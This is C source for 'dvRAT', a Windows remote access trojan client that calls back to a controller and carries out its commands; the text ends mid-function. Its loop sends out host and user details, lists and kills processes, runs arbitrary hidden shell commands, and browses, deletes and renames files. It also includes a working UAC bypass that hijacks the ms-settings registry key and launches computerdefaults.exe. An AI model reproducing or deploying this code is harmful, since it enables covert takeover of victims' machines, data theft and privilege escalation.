// *
// * dvRAT
// * @copyright      Copyright (c) DEvil. (https://www.instagram.com/justalghamdi AKA https://www.github.com/justalghamdi)
// * @author         justalghamdi
// * @version        Release: 0.1
// *
 
#pragma region MACROS

//! START MACROS
#define _CRT_SECURE_NO_WARNINGS


#include <Windows.h>
#include <Shlwapi.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <json-c/json.h>
#include <tlhelp32.h>
#include <Lmcons.h>
#include <tchar.h> 
#include <strsafe.h>
#include <math.h>

#include "_http_request.h"
#include "_win_form.h"

#pragma comment(lib, "User32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winmm.lib" )
#pragma comment(lib, "Shlwapi.lib")



#pragma region commands_to_send_from_client
/* START client send tags */
#define _CLIENT_SEND_MAIN_DIR "client_recv_main_dir;"
#define _CLIENT_SEND_SUB_MAIN_FILES  "client_recv_sub_main_files;"
#define _CLIENT_SEND_SUB_FILES  "client_recv_sub_files;"
#define _START_UP_INFO "start_up_info;"
#define _OK_REFRESH "ok_refresh;"
#define _TSK_MGR "tsk_mgr;"
#define _SEND_NEW_MESSAGE "client_new_message;"
#define _ACTIVE_WINDOW "actv_wndw;"
#define _MAIN_DIRS "main_dirs;"
/* END client send tags */
#pragma endregion

#pragma region command_to_recv_from_server
/* START server recv tags */
#define _START_FILE_EXPLORER "start_fileexplorer;"
#define _GET_THIS_SUB_PATH "get_this_sub_path;"
#define _GET_THIS_SUB_MAIN_PATH "get_this_sub_main_path;"
#define _START_CHAT "start_chat;"
#define _KILL_PID "kill_pid;"
#define _GET_TSK_MGR "get_tsk_mgr;"
#define _OPEN_CD_ROM "open_cd_rom;"
#define _GET_INFO "getinfo;"
#define _REFRESH "refresh;"
#define _SHOW_MESSAGE_BOX "show_message_box;"
#define _EXECUTE_THIS_COMMAND_LINE "execute_this_command_line;"
#define _DELETE_FOLDER "delete_folder;"
#define _DELETE_FILE "delete_file;"
#define _RENAME_FL "rename_fl;" //!? what is fl --- it is `file\folder all` of them use same command
#define _NEW_FILE "new_file;"
#define _NEW_FOLDER "new_folder;"
#define _GET_MAIN_DIRS "get_main_dirs;"
/* END server recv tags */
#pragma endregion


#pragma region define_short_cuts
/* START connection failed tags */
#define ALREADY_CONNECT  10056
#define CONNECTION_REFUSED 10061
/* END connection failed tags */

// START define size_s
#define _1KB 1024
#define _2KB _1KB * 2
#define _4KB _1KB * 4
#define _9KB _1KB * 9
// END define size_s

// START define keywords
#define loop for (;;)
// END define keywords
#pragma endregion


//! END MACROS
#pragma endregion

#pragma region declare_functions
/* START declare functions */
char* inttostr(int n);
void showConsole(BOOL);
void print(const char*);
void msgBox(const char*, const char*, int);
char* hostname_to_ip(const char*);
char** split(const char*, const char*);
struct json_object* get_tsk_mgr_in_json();
struct json_object* fetch_path_in_json(TCHAR*);
BOOL utf16ToUtf8(const wchar_t*, const int, char*);
BOOL get_active_window(char*);
BOOL delete_folder(WCHAR*);
BOOL IsElevated();
int win_system(const char*);
char* wchar_to_char(const wchar_t*);
char* get_pc_name();
char* get_all_disks();
wchar_t* charToWChar(const char*);
int CreateRegKey(char*);
_Bool UACPASSING(char*);
//int silently_remove_directory(LPCTSTR dir);
/* END declare functions */

#pragma endregion



#pragma region optional_code
// START define option codes

/*UACPAYPASS_PLACE_HOLDER_DEFINE*/ //DON't remove!!!

#define UACBYPASS_ENABLE // DELETE THIS !!!

// END define option codes
#pragma endregion



#define HOST "127.0.0.1"//THIS
#define PORT 8080//and THIS SHOULD BE a place holders and set by the server !

INT APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow) {
	
#pragma region bypass_any_AV
// TODO

#pragma endregion

#pragma region conntion_region



	char current_file_name[MAX_PATH];
	GetModuleFileNameA(NULL, current_file_name, MAX_PATH);
	char* ip = (char*)malloc(100);
	char* request = "GET /myip HTTP/1.1\r\nHost: api.ipaddress.com\r\nConnection: close\r\n\r\n";
	ip = get_via_socket(request, "209.126.119.177"); //maybe it uses windows 7 or lower and these versions not support ` libcurl natively `
	if (ip == NULL) {
		ip = "ERR_WHILE_GET_IP";
	}
_start:;
	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		goto _start;
	}
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
	{
		goto _start;
	}
	char* _IP = hostname_to_ip(HOST);
	if (_IP == NULL) {
		goto _start; 
	}
	server.sin_addr.s_addr = inet_addr(_IP);
	server.sin_family = AF_INET;
	server.sin_port = htons(PORT);

	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
	{
		int err_code = WSAGetLastError();
		if (err_code == ALREADY_CONNECT) {
			goto _start;
		}
		else if (err_code == CONNECTION_REFUSED) {
			Sleep(5000);
			goto _start;
		}
		else {
			goto _start;
		}
	}
	char* srvr_recv;
	int recv_size = 0,
		empty_recv = 0;
	DWORD cht_ThreadID;
	HANDLE cht_hndl = NULL;
	setsockopt(
			s,
			IPPROTO_TCP,
			TCP_NODELAY,
			(const char*)1,
			sizeof(BOOL)
	);
#pragma endregion

#pragma region loop_region

	loop{
			srvr_recv = calloc(_2KB, sizeof(char*));
			if ((recv_size = recv(s, srvr_recv, 2000, 0)) == SOCKET_ERROR)
			{
				goto _start;
			}
			if (recv_size == 0) {
				empty_recv++;
			}
			if (empty_recv == 10) {
				goto _start;
			}

			//? explain for the whole process it's just check for 
			//? keyword and execute commands just simple like that

			if (strstr(srvr_recv, _GET_INFO) != NULL) {
				char* all_disks = get_all_disks();
				char Active_Window[256];
				get_active_window(Active_Window);
				TCHAR name[UNLEN + 1];
				DWORD size = UNLEN + 1;
				GetUserNameW((TCHAR*)name, &size);
				char* windows_username = wchar_to_char(name);
				char* pc_name = get_pc_name();
				TCHAR windir[MAX_PATH];
				GetWindowsDirectory(windir, MAX_PATH);
				char* windows_dir = wchar_to_char(windir);
				char info_buffer[_4KB] = _START_UP_INFO;
				strcat(info_buffer, ip);
				strcat(info_buffer, "\n");
				strcat(info_buffer, Active_Window);
				strcat(info_buffer, "\n");
				strcat(info_buffer, windows_username);
				strcat(info_buffer, "\n");
				strcat(info_buffer, pc_name);
				strcat(info_buffer, "\n");
				strcat(info_buffer, windows_dir);
				strcat(info_buffer, "\n");
				strcat(info_buffer, all_disks);
				strcat(info_buffer, "\n");
				if (IsElevated()) {
					strcat(info_buffer, "true_admin");
				}
				else {
					strcat(info_buffer, "false_admin");

				}
				if (send(s, info_buffer, strlen(info_buffer), 0) < 0)
				{
					goto _start;
				}
			}
			else if (strstr(srvr_recv, _REFRESH) != NULL) {
				char Active_Window[256];
				get_active_window(Active_Window);
				char* refresh_message = calloc(strlen(_OK_REFRESH) + strlen(_ACTIVE_WINDOW) + 300, sizeof(char));
				strcat(refresh_message, _OK_REFRESH);
				strcat(refresh_message, "\n");
				strcat(refresh_message, _ACTIVE_WINDOW);
				strcat(refresh_message, Active_Window);
				if (send(s, refresh_message, strlen(refresh_message), 0) < 0)
				{
					goto _start;
				}
				free(refresh_message);
			}
			else if (strstr(srvr_recv, _SHOW_MESSAGE_BOX) != NULL) {
				char** tags = split(srvr_recv, "\n");
				char* title = tags[1];
				char* message = tags[2];
				char* ico = tags[3];
				if (ico != NULL) {
					if (strstr(ico, "ER") != NULL) {

						msgBox(message, title, MB_ICONERROR);

					}
					else if (strstr(ico, "QU") != NULL) {

						msgBox(message, title, MB_ICONQUESTION);

					}
					else if (strstr(ico, "WA") != NULL) {

						msgBox(message, title, MB_ICONWARNING);

					}
					else if (strstr(ico, "IN") != NULL) {

						msgBox(message, title, MB_ICONINFORMATION);

					}
					else {
						msgBox(message, title, 0x0); // Show the message whatever it happend
					}
				}
				else {
					msgBox(message, title, 0x0); // Show the message whatever it happend
				}
				free(tags);
			}
			else if (strstr(srvr_recv, _OPEN_CD_ROM) != NULL) {
				mciSendString(L"set cdaudio door open", 0, 0, 0);
			}
			else if (strstr(srvr_recv, _GET_TSK_MGR) != NULL) {

				struct json_object* tsk_mgr_obj = get_tsk_mgr_in_json();
				const char* objChar = json_object_to_json_string(tsk_mgr_obj);
				char tsk_mgr_tag[_9KB] = _TSK_MGR;
				char size[100];
				sprintf(size, "%d\n", strlen(tsk_mgr_tag) + strlen(objChar));
				strcat(tsk_mgr_tag, size);
				strcat(tsk_mgr_tag, objChar);
				int len = strlen(tsk_mgr_tag);
				if (send(s, tsk_mgr_tag, len, 0) < 0)
				{
					goto _start;
				}
			}
			else if (strstr(srvr_recv, _KILL_PID) != NULL)
			{
				char* PID = srvr_recv + strlen(_KILL_PID);
				char request_to_kill[100] = "taskkill /F /PID ";
				strcat(request_to_kill, PID);
				win_system(request_to_kill);
			}
			else if (strstr(srvr_recv, _START_CHAT) != NULL) {
				//showConsole(FALSE);
			_start_thread_chat:;
				DATA data;
				data.s = &s;
				data.hInstance = &hInstance;
				cht_hndl = CreateThread(NULL, 0, show_chat_form, (void*)&data, 0, &cht_ThreadID);
				if (WaitForSingleObject(cht_hndl, INFINITE) == WAIT_OBJECT_0) {
					DWORD _exitcode;
					if (GetExitCodeThread(cht_hndl, &_exitcode)) {
						if (_exitcode == 1) {
							TerminateThread(cht_hndl, 0);
							CloseHandle(cht_hndl);
						}
						else {
							goto _start_thread_chat;
						}
					}
					else {
						goto _start_thread_chat;
					}
				}
				else {
					TerminateThread(cht_hndl, 0);//! I know it's very dangerous, but who cares?
					CloseHandle(cht_hndl);
				}
			}
			else if (strstr(srvr_recv, _START_FILE_EXPLORER) != NULL) {
				char** tags = split(srvr_recv, "\n");
				char* main_dir_to_fetch = tags[1];
				struct json_object* files_in_min_dir = fetch_path_in_json(charToWChar(main_dir_to_fetch));
				if (files_in_min_dir != NULL) {
					char* objChar = json_object_to_json_string(files_in_min_dir);
					int _size = strlen(objChar) + _4KB /*extra size*/;
					char* fil_exp_tag = calloc(_size, sizeof(char));
					int size_to_send = 0;
					char* new_line = "\n";
					size_to_send += strlen(_CLIENT_SEND_MAIN_DIR) +
						strlen(objChar) +
						strlen(new_line);
					size_to_send += strlen(inttostr(size_to_send));
					char* size = inttostr(size_to_send);
					memcpy(
						fil_exp_tag,
						_CLIENT_SEND_MAIN_DIR,
						strlen(_CLIENT_SEND_MAIN_DIR)
					);
					memcpy(
						fil_exp_tag + strlen(_CLIENT_SEND_MAIN_DIR),
						size,
						strlen(size) + 1
					);
					memcpy(
						fil_exp_tag + strlen(_CLIENT_SEND_MAIN_DIR) + strlen(size),
						new_line,
						strlen(new_line) + 1
					);
					memcpy(
						fil_exp_tag + strlen(_CLIENT_SEND_MAIN_DIR) + strlen(size) + strlen(new_line),
						objChar,
						strlen(objChar) + 1
					);
					int len = strlen(fil_exp_tag);
					if (send(s, fil_exp_tag, len, 0) < 0)
					{
						goto _start;
					}
				}
				else {
					char info_buffer[_1KB] = _CLIENT_SEND_MAIN_DIR;
					strcat(info_buffer, "err");
					if (send(s, info_buffer, strlen(info_buffer), 0) < 0)
					{
						goto _start;
					}
				}
					free(tags);

			}
			else if (strstr(srvr_recv, _GET_THIS_SUB_MAIN_PATH) != NULL) {
				char** tags = split(srvr_recv, "\n");
				char* dir_to_fetch = tags[1];
				struct json_object* files_in_min_dir = fetch_path_in_json(charToWChar(dir_to_fetch));
				if (files_in_min_dir != NULL) {
					char* objChar = json_object_to_json_string(files_in_min_dir);
					int _size = strlen(objChar) + _4KB /*extra size*/;
					char* fil_exp_tag = calloc(_size, sizeof(char));
					int size_to_send = 0;
					char* new_line = "\n";
					size_to_send += strlen(_CLIENT_SEND_SUB_MAIN_FILES) +
						strlen(objChar) +
						strlen(new_line);
					size_to_send += strlen(inttostr(size_to_send));
					char* size = inttostr(size_to_send);
					memcpy(
						fil_exp_tag,
						_CLIENT_SEND_SUB_MAIN_FILES,
						strlen(_CLIENT_SEND_SUB_MAIN_FILES)
					);
					memcpy(
						fil_exp_tag + strlen(_CLIENT_SEND_SUB_MAIN_FILES),
						size,
						strlen(size) + 1
					);
					memcpy(
						fil_exp_tag + strlen(_CLIENT_SEND_SUB_MAIN_FILES) + strlen(size),
						new_line,
						strlen(new_line) + 1
					);
					memcpy(
						fil_exp_tag + strlen(_CLIENT_SEND_SUB_MAIN_FILES) + strlen(size) + strlen(new_line),
						objChar,
						strlen(objChar) + 1
					);
					int len = strlen(fil_exp_tag);
					if (send(s, fil_exp_tag, len, 0) < 0)
					{
						goto _start;
					}
				}
				else {
					char info_buffer[_1KB] = _CLIENT_SEND_SUB_MAIN_FILES;
					strcat(info_buffer, "err");
					if (send(s, info_buffer, strlen(info_buffer), 0) < 0)
					{
						goto _start;
					}
				}
				free(tags);

			}
			else if (strstr(srvr_recv,_GET_THIS_SUB_PATH) != NULL) {
				char** tags = split(srvr_recv, "\n");
				char* dir_to_fetch = tags[1];
				struct json_object* files_in_min_dir = fetch_path_in_json(charToWChar(dir_to_fetch));
				if (files_in_min_dir != NULL) {
					char* objChar = json_object_to_json_string(files_in_min_dir);
					int _size = strlen(objChar) + _4KB /*extra size*/;
					char* fil_exp_tag = calloc(_size, sizeof(char));
					int size_to_send = 0;
					char* new_line = "\n";
					size_to_send += strlen(_CLIENT_SEND_SUB_FILES) +
						strlen(objChar) +
						strlen(new_line);
					size_to_send += strlen(inttostr(size_to_send));
					char* size = inttostr(size_to_send);
					memcpy(
						fil_exp_tag,
						_CLIENT_SEND_SUB_FILES,
						strlen(_CLIENT_SEND_SUB_FILES)
					);
					memcpy(
						fil_exp_tag + strlen(_CLIENT_SEND_SUB_FILES),
						size,
						strlen(size) + 1
					);
					memcpy(
						fil_exp_tag + strlen(_CLIENT_SEND_SUB_FILES) + strlen(size),
						new_line,
						strlen(new_line) + 1
					);
					memcpy(
						fil_exp_tag + strlen(_CLIENT_SEND_SUB_FILES) + strlen(size) + strlen(new_line),
						objChar,
						strlen(objChar) + 1
					);
					int len = strlen(fil_exp_tag);
					if (send(s, fil_exp_tag, len, 0) < 0)
					{
						goto _start;
					}
				}
				else {
					char info_buffer[_1KB] = _CLIENT_SEND_SUB_FILES;
					strcat(info_buffer, "err");
					if (send(s, info_buffer, strlen(info_buffer), 0) < 0)
					{
						goto _start;
					}

				}
				free(tags);

			}
			else if (strstr(srvr_recv, _EXECUTE_THIS_COMMAND_LINE) != NULL) {
				  char** tags = split(srvr_recv, "\n");
				  char* command = tags[1];
				  win_system(command);
			}
			else if (strstr(srvr_recv, _DELETE_FOLDER) != NULL) {
				char** tags = split(srvr_recv, "\n");
				char* folder = tags[1];
				WCHAR* Wfolder = charToWChar(folder);
				if (!delete_folder(Wfolder)) {
					//TODO: HANDLE ERR
				}


			}
			else if (strstr(srvr_recv, _DELETE_FILE) != NULL) {
				char** tags = split(srvr_recv, "\n");
				char* file = tags[1];
				WCHAR* Wfile = charToWChar(file);
				if (!DeleteFileW(Wfile)) {
					//TODO: HANDLE ERR
				}
			}
			else if (strstr(srvr_recv, _RENAME_FL) != NULL) {
				char** tags = split(srvr_recv, "\n");
				char* old_name = tags[1];
				char* new_name = tags[2];
				if (MoveFileExA(old_name, new_name, MOVEFILE_COPY_ALLOWED)) {

				}
				else {
					//TODO: HANDLE ERR
				}

			}
			else if (strstr(srvr_recv, _NEW_FILE) != NULL) {
				char** tags = split(srvr_recv, "\n");
				char* file_path = tags[1];
				// or fopen(file_name,"a"); 
				HANDLE hFile = CreateFileA(file_path,GENERIC_READ | GENERIC_WRITE,(int)NULL,NULL,CREATE_NEW,FILE_ATTRIBUTE_NORMAL,NULL);
				if (hFile == INVALID_HANDLE_VALUE) {
					//TODO: HANDLE ERR
				}
				if (GetLastError() == ERROR_ALREADY_EXISTS || GetLastError() == ERROR_FILE_EXISTS) {
					CloseHandle(hFile);
					//TODO: HANDLE ERR
				}
				CloseHandle(hFile);
			}
			else if (strstr(srvr_recv, _NEW_FOLDER) != NULL) {
				char** tags = split(srvr_recv, "\n");
				char* folder_path = tags[1];
				CreateDirectoryA(folder_path, NULL);
				if (GetLastError() == ERROR_ALREADY_EXISTS) {
					//TODO: HANDLE ERR
				}
			}
			else if (strstr(srvr_recv, _GET_MAIN_DIRS) != NULL) {
				char* all_disks = get_all_disks();
				TCHAR name[UNLEN + 1];
				DWORD size = UNLEN + 1;
				GetUserNameW((TCHAR*)name, &size);
				char* windows_username = wchar_to_char(name);
				char* pc_name = get_pc_name();
				TCHAR windir[MAX_PATH];
				GetWindowsDirectory(windir, MAX_PATH);
				char* windows_dir = wchar_to_char(windir);
				char* dirs = calloc(strlen(windows_dir) + strlen(pc_name) + strlen(windows_username) + strlen(all_disks) + BUFSIZ , sizeof(char));
				strcat(dirs, _MAIN_DIRS);
				strcat(dirs, "\n");
				strcat(dirs, windows_username);
				strcat(dirs, "\n");
				strcat(dirs, pc_name);
				strcat(dirs, "\n");
				strcat(dirs, windows_dir);
				strcat(dirs, "\n");
				strcat(dirs, all_disks);
				if (send(s, dirs, strlen(dirs), 0) < 0)
				{
					goto _start;
				}
				
			}
#ifdef UACBYPASS_ENABLE
			else if (strstr(srvr_recv, "uacbypass;") != NULL)
			{
				UACPASSING(current_file_name); 
				system("start computerdefaults.exe"); 
				exit(0); 
			} 
#endif

			//TODO: Complete commands `else if`
			free(srvr_recv);
			

		}/* END loop */
#pragma endregion
	
	return EXIT_SUCCESS;//! IT SHOULD NOT EXIT !!
}

void showConsole(BOOL mod) {
	HWND Stealth;
	if (AllocConsole()) {
		Stealth = FindWindowA("ConsoleWindowClass", NULL);
		ShowWindow(Stealth, mod);
	}
}


void msgBox(const char* msg, const char* title, int ico) {
	MessageBoxA(NULL, msg, title, ico | MB_OK);

}

char* get_all_disks() {
	TCHAR szDrive[] = _T(" A:");
	char* disk_tag = calloc(1023, sizeof(char));
	strcat(disk_tag, "START&=");
	DWORD uDriveMask = GetLogicalDrives();


	while (uDriveMask) {

		if (uDriveMask & 1) {
			strcat(disk_tag, wchar_to_char(szDrive));
			strcat(disk_tag, "&=");

		}
		++szDrive[1];
		uDriveMask >>= 1;

	}
	strcat(disk_tag, "END");
	return disk_tag;
}

char* str_replace(char* orig, char* rep, char* with) {
	char* result;
	char* ins;
	char* tmp;
	int len_rep;
	int len_with;
	int len_front;
	int count;

	if (!orig || !rep)
		return NULL;
	len_rep = strlen(rep);
	if (len_rep == 0)
		return NULL;
	if (!with)
		with = "";
	len_with = strlen(with);


	ins = orig;
	for (count = 0; tmp = strstr(ins, rep); ++count) {
		ins = tmp + len_rep;
	}

	tmp = result = malloc(strlen(orig) + (len_with - len_rep) * count + 1);

	if (!result)
		return NULL;

	while (count--) {
		ins = strstr(orig, rep);
		len_front = ins - orig;
		tmp = strncpy(tmp, orig, len_front) + len_front;
		tmp = strcpy(tmp, with) + len_with;
		orig += len_front + len_rep;
	}
	strcpy(tmp, orig);
	return result;
}

BOOL delete_folder(WCHAR * Wfolder) {
	//first Delete the contents of the folder,
	//whether it is folders and files .

	char path_folder[MAX_PATH] = "";
	strcat(path_folder, wchar_to_char(Wfolder));
	//Check if folder is not empty
	if (!PathIsDirectoryEmptyW(Wfolder)) {
		//fetch folder
		struct json_object* files_in_dir_obj = fetch_path_in_json(Wfolder);
		if (files_in_dir_obj != NULL) {
			//to check if jsonObject contain dir
			char* objChar = json_object_to_json_string(files_in_dir_obj);
			if (strstr(objChar, "DIR") != NULL) {
				enum json_type type;
				json_object_object_foreach(files_in_dir_obj, key, val) {
					type = json_object_get_type(val);
					switch (type)
					{
					case json_type_array:
					{
						//delete folders
						struct json_object* arr = json_object_object_get(files_in_dir_obj, "DIR");
						int count_arr = json_object_array_length(arr);
						for (int i = 0; i < count_arr; i++)
						{

							json_object* element = json_object_array_get_idx(arr, i);
							char* Folder_str = json_object_get_string(element);
							if (!PathIsDirectoryEmptyW(charToWChar(Folder_str))) {

								char reg[MAX_PATH] = "";//regex for folder
								strcat(reg, path_folder);
								strcat(reg, "\\");
								strcat(reg, Folder_str);
								char* rp = str_replace(reg, "\\", "/");
								wchar_t* folder_to_remove = charToWChar(rp);
								folder_to_remove[lstrlenW(folder_to_remove) + 1] = L'\0';
								SHFILEOPSTRUCTW FileOp;
								ZeroMemory(&FileOp, sizeof(SHFILEOPSTRUCT));
								FileOp.fFlags = FOF_SILENT | FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_NOCONFIRMMKDIR;
								FileOp.hNameMappings = NULL;
								FileOp.hwnd = NULL;
								FileOp.lpszProgressTitle = NULL;
								FileOp.pFrom = folder_to_remove;
								FileOp.pTo = NULL;
								FileOp.wFunc = FO_DELETE;
								SHFileOperationW(&FileOp); //fast way ShellApi
							}
							else {
								if (RemoveDirectoryW(Folder_str)) {
									return TRUE;
								}
								else {
									return FALSE;

								}
							}
						}
					}
					break;
					case json_type_int/*the int value is for a file key*/:
					{
						//delete files
						char* file_name = key;
						char reg[MAX_PATH] = "\\\\.\\";//regex for folder
						strcat(reg, path_folder);
						strcat(reg, "\\");
						strcat(reg, file_name);
						WCHAR* file_path = charToWChar(reg);
						if (DeleteFileW(file_path)) {}
						else {
							return FALSE;
						}

					}
					break;
					}
				}
				if (RemoveDirectoryW(Wfolder)) {
					return TRUE;
				}
				else {
					return FALSE;
				}
			}
			else {
				enum json_type type;
				json_object_object_foreach(files_in_dir_obj, key, val) {
					type = json_object_get_type(key);
					switch (type)
					{
					case json_type_string:
					{
						//delete files
						char* file_name = json_object_get_string(files_in_dir_obj, val);
						WCHAR* wFile_name = charToWChar(file_name);
						if (DeleteFileW(wFile_name)) {}
						else {
							return FALSE;
						}
					}
					break;
					}
				}
			}
		}
		else {
			return FALSE;
		}
	}
	else {
		if (RemoveDirectoryW(Wfolder)) {
			return TRUE;
		}
		else {
			return FALSE;
		}
	}
	return FALSE;
}
#ifdef _DEBUG
void print(const char* buffer) {
	HANDLE __HSTDOUT = GetStdHandle(STD_OUTPUT_HANDLE);
	WriteConsoleA(__HSTDOUT, buffer, (UINT)strlen(buffer), (UINT*)0, NULL);
}
#endif

char** split(const char* str, const char* delim) {
	char* s = _strdup(str);
	if (strtok(s, delim) == 0) {
		return NULL;
	}
	int nw = 1;
	while (strtok(NULL, delim) != 0)
		nw += 1;
	strcpy(s, str);
	char** v = malloc((nw + 1) * sizeof(char*));
	int i;
	v[0] = _strdup(strtok(s, delim));
	for (i = 1; i != nw; ++i) {
		v[i] = _strdup(strtok(NULL, delim));
	}
	v[i] = NULL;
	free(s);
	return v;
}

char* hostname_to_ip(const char* hostname) {
	struct hostent* he;
	struct in_addr** addr_list;
	int i;
	char* ip = malloc(100);
	if ((he = gethostbyname(hostname)) == NULL)
	{
		perror("gethostbyname");
		return NULL;
	}

	addr_list = (struct in_addr**)he->h_addr_list;

	for (i = 0; addr_list[i] != NULL; i++)
	{
		strcpy(ip, inet_ntoa(*addr_list[i]));
		return ip;
	}
	return NULL;
}

struct json_object* get_tsk_mgr_in_json() {
	struct json_object* jobj;
	jobj = json_object_new_object();
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE) {
		printf("CreateToolhelp32Snapshot() failed with error %d\n", GetLastError());
		return NULL;
	}

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(pe);

	BOOL ok = Process32First(hSnap, &pe);
	if (!ok) {

		return NULL;
	}

	char name[MAX_PATH];

	while (ok) {
		if (utf16ToUtf8(pe.szExeFile, sizeof(name), name)) {
			json_object_object_add(jobj, name, json_object_new_int((int)pe.th32ProcessID));
		}
		else {

		}

		ok = Process32Next(hSnap, &pe);
	}

	CloseHandle(hSnap);
	return jobj;
}

struct json_object* fetch_path_in_json(WCHAR * path) {
	struct json_object* jobj = json_object_new_object();
	json_object* dir_array = json_object_new_array();
	WIN32_FIND_DATA ffd;
	LARGE_INTEGER filesize;
	TCHAR szDir[MAX_PATH];
	size_t length_of_arg;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	DWORD dwError = 0;


	StringCchLengthW(path, MAX_PATH, &length_of_arg);

	if (length_of_arg > (MAX_PATH - 3))
	{

		return (-1);
	}


	StringCchCopyW(szDir, MAX_PATH, path);
	StringCchCatW(szDir, MAX_PATH, TEXT("\\*"));

	hFind = FindFirstFile(szDir, &ffd);

	if (INVALID_HANDLE_VALUE == hFind)
	{

		return NULL;
	}
	do
	{
		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if (
				strcmp(wchar_to_char(ffd.cFileName), ".")
				&&
				strcmp(wchar_to_char(ffd.cFileName), "..")
				)
			{

				char* FolderName = wchar_to_char(ffd.cFileName);
				json_object_array_add(dir_array, json_object_new_string(FolderName));
			}
		}
		else
		{
			filesize.LowPart = ffd.nFileSizeLow;
			filesize.HighPart = ffd.nFileSizeHigh;
			char* FileName = wchar_to_char(ffd.cFileName);

			json_object_object_add(jobj, FileName, json_object_new_int(filesize.QuadPart));

		}
	} while (FindNextFile(hFind, &ffd) != 0);
	json_object_object_add(jobj, "DIR", dir_array);

	dwError = GetLastError();
	if (dwError != ERROR_NO_MORE_FILES)
	{
		return NULL;
	}

	FindClose(hFind);
	return jobj;
}

BOOL utf16ToUtf8(const wchar_t* source, const int size, char* destination)
{
	if (!WideCharToMultiByte(CP_UTF8, 0, source, -1, destination, size, NULL, NULL)) {

		return FALSE;
	}

	return TRUE;
}

int win_system(const char* command)
{


	char* tmp_command, * cmd_exe_path;
	int         ret_val = 0;
	size_t          len = { 0 };
	PROCESS_INFORMATION process_info = { 0 };
	STARTUPINFOA        startup_info = { 0 };


	len = strlen(command);
	tmp_command = malloc(len + 4);
	tmp_command[0] = 0x2F;
	tmp_command[1] = 0x63;
	tmp_command[2] = 0x20;
	memcpy(tmp_command + 3, command, len + 1);

	startup_info.cb = sizeof(STARTUPINFOA);
	cmd_exe_path = getenv("COMSPEC");
	_flushall();

	if (CreateProcessA(cmd_exe_path, tmp_command, NULL, NULL, 0, CREATE_NO_WINDOW, NULL, NULL, &startup_info, &process_info)) {
		WaitForSingleObject(process_info.hProcess, INFINITE);
		GetExitCodeProcess(process_info.hProcess, &ret_val);
		CloseHandle(process_info.hProcess);
		CloseHandle(process_info.hThread);
	}
	else {
		return NULL;
	}

	free((void*)tmp_command);

	return(ret_val);
}

BOOL get_active_window(char* window_title) {
	HWND foreground = GetForegroundWindow();
	if (foreground)
	{
		GetWindowTextA(foreground, window_title, 256);
		return TRUE;
	}
	return NULL;
}

char* wchar_to_char(const wchar_t* pwchar)
{
	char szTo[_1KB];
	szTo[lstrlenW(pwchar)] = '\0';
	WideCharToMultiByte(CP_ACP, 0, pwchar, -1, szTo, (int)lstrlenW(pwchar), NULL, NULL);
	char* chr = _strdup(szTo);
	return chr;
}

wchar_t* charToWChar(const char* text)
{
	wchar_t wszTo[_1KB];
	wszTo[strlen(text)] = L'\0';
	MultiByteToWideChar(CP_ACP, 0, text, -1, wszTo, (int)strlen(text));
	wchar_t* wchr = StrDupW(wszTo);
	return wchr;
}

char* get_pc_name() {
	char* pc_name = getenv("COMPUTERNAME");
	return pc_name;
}

char* inttostr(int n) {
	char* result;
	if (n >= 0)
		result = malloc(floor(log10(n)) + 2);
	else
		result = malloc(floor(log10(n)) + 3);
	sprintf(result, "%d", n);
	return result;
}


#pragma region OPTIONAL_FUNCTIONS
#ifdef UACBYPASS_ENABLE
int CreateRegKey(char* path) {
	HKEY hKey;
	DWORD ZERO = 0;
	LSTATUS lResult;
	if ((lResult = RegOpenKeyExA(HKEY_CURRENT_USER, path, 0, KEY_SET_VALUE, &hKey)) == ERROR_FILE_NOT_FOUND) {
		if ((lResult = RegCreateKeyA(HKEY_CURRENT_USER, path, &hKey)) == ERROR_SUCCESS) {
			return lResult;
		}
	}

}

_Bool UACPASSING(char* exepath) {
	CreateRegKey("Software\\Classes");
	CreateRegKey("Software\\Classes\\ms-settings");
	CreateRegKey("Software\\Classes\\ms-settings\\shell");
	CreateRegKey("Software\\Classes\\ms-settings\\shell\\open");
	CreateRegKey("Software\\Classes\\ms-settings\\shell\\open\\command");
	char* $ = "Software\\Classes\\ms-settings\\shell\\open\\command";
	HKEY hKey;
	DWORD ZERO = 0;
	LSTATUS lResult;
	_Bool closekey = FALSE;
_UACBYPASS:;
	if ((lResult = RegOpenKeyExA(HKEY_CURRENT_USER, $, 0, KEY_SET_VALUE, &hKey)) == ERROR_SUCCESS) {
		closekey = TRUE;
		//printf("[+] Done Open REG\n");
	}
	else {
		if (lResult == ERROR_FILE_NOT_FOUND) {
			if ((lResult = RegCreateKeyA(HKEY_CURRENT_USER, $, &hKey)) == ERROR_SUCCESS) {
				goto _UACBYPASS;
			}
			else {
				printf("Error while opening REG Exiting | RegCreateKeyA | %d", lResult);

			}
		}
		else {
			printf("Error while opening REG Exiting | RegOpenKeyExA | %d", lResult);
		}
		return FALSE;
	}

	if ((lResult = RegSetValueExA(hKey, "", 0, REG_SZ, (BYTE*)exepath, strlen(exepath))) == ERROR_SUCCESS) {

	}
	else {
		return FALSE;
	}

	if ((lResult = RegSetValueExA(hKey, "DelegateExecute", 0, REG_DWORD, (const BYTE*)&ZERO, sizeof(ZERO))) == ERROR_SUCCESS) {

	}
	else {
		return FALSE;
	}

	if (closekey) {
		RegCloseKey(hKey);
	}

	return TRUE;

}

BOOL IsElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), 0x0008, &hToken)) {
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, (TOKEN_INFORMATION_CLASS)20, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
